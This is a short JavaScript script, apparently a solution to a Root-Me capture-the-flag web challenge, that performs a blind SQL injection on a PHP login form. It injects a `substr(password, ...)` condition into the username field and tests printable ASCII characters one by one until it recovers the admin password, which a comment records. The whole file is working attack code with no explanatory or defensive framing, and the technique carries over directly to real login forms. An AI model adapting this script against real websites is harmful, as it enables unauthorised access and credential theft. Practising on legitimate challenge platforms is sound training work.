```js
// En supposant des requêtes POST successives jusqu'à trouver la longueur exacte du mot de passe avec length(password)
const PASSWORD_LENGTH = 8;
const password = [];

// Injection SQL de la query permettant de tester le caractère char à la position index pour le mot de passe de l'utilisateur admin
const guess = async (index, char) => {
  // Données du formulaire PHP
  const formData = new FormData();
  formData.append('username', `admin' and substr(password, ${index}, 1) = '${char}' --`);
  formData.append('password', '123');

  const response = await fetch('http://challenge01.root-me.org/web-serveur/ch10/', {
    method: 'POST',
    body: formData,
  });

  const html = await response.text();
  // True si la page HTML de retour indique une "connexion", false sinon
  return html.includes('Welcome back admin !');
};

// Test séquentiel de chaque caractère de la table ASCII pour la position donnée dans le mot de passe, jusqu'à découverte du bon caractère
const findCharacter = async (index) => {
  for (let i = 32; i <= 126; ++i) {
    // Caractère de la table ASCII à partir de son numéro
    const character = String.fromCharCode(i);
    const isValid = await guess(index, character);
    if (isValid) return character;
  }
};

const main = async () => {
  for (let i = 1; i <= PASSWORD_LENGTH; ++i) {
    password.push(await findCharacter(i));
  }

  // e2azO93i
  console.log(password.join(''));
};

main();
```
